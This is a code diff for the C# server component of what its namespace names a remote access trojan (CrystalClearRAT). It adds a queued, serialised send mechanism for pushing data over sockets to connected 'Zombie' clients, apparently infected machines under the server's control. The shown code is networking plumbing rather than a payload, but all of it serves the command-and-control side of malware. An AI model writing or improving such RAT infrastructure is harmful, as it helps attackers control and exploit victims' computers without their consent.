@@ -16,12 +16,36 @@ namespace CrystalClearRAT.Web
 {
     public static class Server
     {
+        private static readonly Queue<Action> sendRequest = new Queue<Action>();
+        private static readonly ManualResetEvent sendingDone = new ManualResetEvent(false);
 
+        private static bool sendMonitorRunning = false;
 
         public static bool IsRunning { get; private set; } = false;
 
         public static Socket ServerSocket { get; private set; }
 
+
+        private static void SendMonitor()
+        {
+            if (!sendMonitorRunning)
+                Task.Run(async () =>
+                {
+                    sendMonitorRunning = true;
+                    while (true)
+                    {
+                        await Task.Delay(10);
+                        if (sendRequest.Count > 0)
+                        {
+                            sendRequest.Dequeue()();
+                            sendingDone.WaitOne();
+                        }
+                        else break;
+                    }
+                    sendMonitorRunning = false;
+                });
+
+        }
 
         public static void Start(int port)
         {
@@ -32,20 +56,28 @@ namespace CrystalClearRAT.Web
             ServerSocket.Listen(0);
 
             ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
+            SendMonitor();
         }
 
         public static void Send(byte[] data, Zombie zombie)
         {
-            byte[] dataLength = BitConverter.GetBytes(data.Length);
+            sendRequest.Enqueue(() =>
+            {
+                sendingDone.Reset();
+                byte[] dataLength = BitConverter.GetBytes(data.Length);
+                try
+                {
+                    zombie.Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(zombie, data));
+                }
 
-            try
-            {
-                zombie.Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(zombie, data));
-            }
-            catch (SocketException)
-            {
-                zombie.Destroy();
-            }
+                catch (SocketException)
+                {
+                    zombie.Destroy();
+                }
+            });
+
+            SendMonitor();
+
         }
 
         private static void SendCallback(IAsyncResult ar)
@@ -60,7 +92,7 @@ namespace CrystalClearRAT.Web
             {
                 state.Zombie.Destroy();
             }
-
+            sendingDone.Set();
         }
 
         private static void AcceptCallback(IAsyncResult ar)
